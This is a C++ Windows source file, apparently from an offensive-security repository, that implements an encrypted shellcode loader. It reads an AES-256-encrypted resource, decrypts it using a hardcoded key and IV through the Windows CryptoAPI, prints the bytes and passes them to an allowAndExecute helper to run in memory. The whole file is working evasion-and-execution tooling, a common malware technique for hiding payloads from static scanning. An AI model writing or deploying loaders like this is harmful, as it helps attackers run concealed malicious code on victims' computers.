#include <windows.h>
#include <stdio.h>
#include "..\utils\utility.h"
#include "..\utils\resources.h"

BYTE key[] = {0x23,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x66,0x61,0x63,0x69,0x6c,0x65,0x23,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x66,0x61,0x63,0x69,0x6c,0x65};
BYTE initializevector[] = {0x97,0xb0,0x94,0xf9,0x72,0xa0,0xf2,0x23,0x9b,0xef,0xbc,0xeb,0xe7,0xe7,0x3b,0x4a};

// g++ -m64 -o aesCurrentProcessRsc.exe aesCurrentProcessRsc.cpp ../utils/utility.cpp ../utils/resources.o -ladvapi32
int main(int argc, char const *argv[])
{
    DWORD               oldProtection;
    LPVOID              resAddr;
    PUCHAR              decrypted;
    DWORD               decryptedSize;      
    HCRYPTPROV          cspHandle;
    HCRYPTKEY           keyHandle;
    DWORD               keyBlobHeaderSize   = sizeof(BLOBHEADER);
    DWORD               keySize             = sizeof(key);
    DWORD               dwordSize           = sizeof(DWORD);
    BYTE                keyBlob[keyBlobHeaderSize + dwordSize + keySize];
    BLOBHEADER          *keyBlobHeader; 

    
    getResourceAddr(&resAddr, &decryptedSize, RSC_AES);
    MESSAGE(OKAY, "Resource loaded\n");

    // Decrypt encrypted data from resource file here...
    // Get a handle to a key container with a cryptographic service provider
    if (!CryptAcquireContext(&cspHandle, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
        MESSAGE(FAIL, "Impossible to  Get a handle to a key container\n");
        PRINT_ERROR(CryptAcquireContext);
        return EXIT_FAILURE;
    }
    // Generate key handle by importation
    keyBlobHeader = (BLOBHEADER*)keyBlob;
    keyBlobHeader->bType = PLAINTEXTKEYBLOB;
    keyBlobHeader->bVersion = CUR_BLOB_VERSION;
    keyBlobHeader->reserved = 0;
    keyBlobHeader->aiKeyAlg = CALG_AES_256;
    
    memcpy(keyBlob + keyBlobHeaderSize, &keySize, dwordSize);
    memcpy(keyBlob + keyBlobHeaderSize + dwordSize, key, keySize);  

    if(!CryptImportKey(cspHandle, keyBlob, sizeof(keyBlob), 0, 0, &keyHandle)){
        MESSAGE(FAIL, "Impossible to import the key\n");
        PRINT_ERROR(CryptImportKey);
        return EXIT_FAILURE;
    }

    // Set key parameter for decryption
    CryptSetKeyParam(keyHandle, KP_IV, initializevector, 0);
    CryptSetKeyParam(keyHandle, KP_MODE, (const BYTE*)CRYPT_MODE_CBC, 0);

    // Decrypt padded data
    decrypted = (PUCHAR)VirtualAlloc(0, decryptedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(decrypted, resAddr, decryptedSize);
    MESSAGE(OKAY, "Data to be decrypted at : 0x%p\n", decrypted);
    MESSAGE(INFO, "Press <enter> to decrypt...");
    getchar();
    if(!CryptDecrypt(keyHandle, 0, TRUE, 0, decrypted, &decryptedSize)){
        MESSAGE(FAIL, "Impossible to Decrypt the data\n");
        PRINT_ERROR(CryptDecrypt);
        return EXIT_FAILURE;
    }

    // print decryipted padded data
    MESSAGE(OKAY, "Decrypted data : [%ld bytes]\n", decryptedSize);
    for(int i = 0; i < decryptedSize; i++ ){
        printf("\\x%2x", decrypted[i]);
    }
    puts("");

    allowAndExecute((LPVOID)decrypted, decryptedSize);

    // Release resources
    CryptReleaseContext(cspHandle, 0);
    CryptDestroyKey(keyHandle);
    free(decrypted);

    return EXIT_SUCCESS;
}
